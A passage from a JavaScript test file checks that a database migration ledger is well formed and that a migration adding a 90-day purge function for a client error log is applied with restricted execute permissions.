                .toBe(`${f}: true`);
        }
    });

    test('the snapshot is the committed record, not a guess', () => {
        const raw = fsx.readFileSync(pathx.join(MIG, 'APPLIED_LEDGER.tsv'), 'utf8');
        const rows = raw.split('\n').filter(l => l.trim() && !l.startsWith('#'));
        expect(rows.length > 100).toBe(true);
        // Every row is version<TAB>name, and versions are unique and sorted —
        // an unsorted or duplicated ledger means it was hand-edited.
        const versions = rows.map(r => r.split('\t')[0]);
        expect(versions.every(v => /^\d{14}$/.test(v))).toBe(true);
        expect(new Set(versions).size).toBe(versions.length);
        expect(versions.join()).toBe([...versions].sort().join());
    });

    test('the purge migration that never ran is applied and recorded', () => {
        // The one real casualty of the drift: client_error_log promised a
        // 90-day retention window in its own header and never got the
        // function that enforces it, because the failure that would have
        // said so was lost in 114 lines of noise.
        const sql = readMigration('purge_client_error_log');
        expect(/CREATE OR REPLACE FUNCTION public\.purge_client_error_log/.test(sql)).toBe(true);
        expect(/REVOKE EXECUTE[^;]*FROM PUBLIC, anon/.test(sql)).toBe(true);
        expect(/GRANT\s+EXECUTE[^;]*TO authenticated/.test(sql)).toBe(true);
        // And it is in the ledger, so it is no longer pending.
        const ledger = fsx.readFileSync(pathx.join(MIG, 'APPLIED_LEDGER.tsv'), 'utf8');
        expect(/\tpurge_client_error_log$/m.test(ledger)).toBe(true);
    });
});


// Settle any async test bodies before counting up. Every test() whose body
// returned a promise is in _pending, already wrapped so it cannot reject here
// — so this only ever waits, it never throws.
Promise.all(_pending).then(() => {
    console.log(`\n  Results: ${_passed} passed, ${_failed} failed\n`);
    if (_failed > 0) process.exitCode = 1;
    if (_failed > 0) process.exit(1);
});
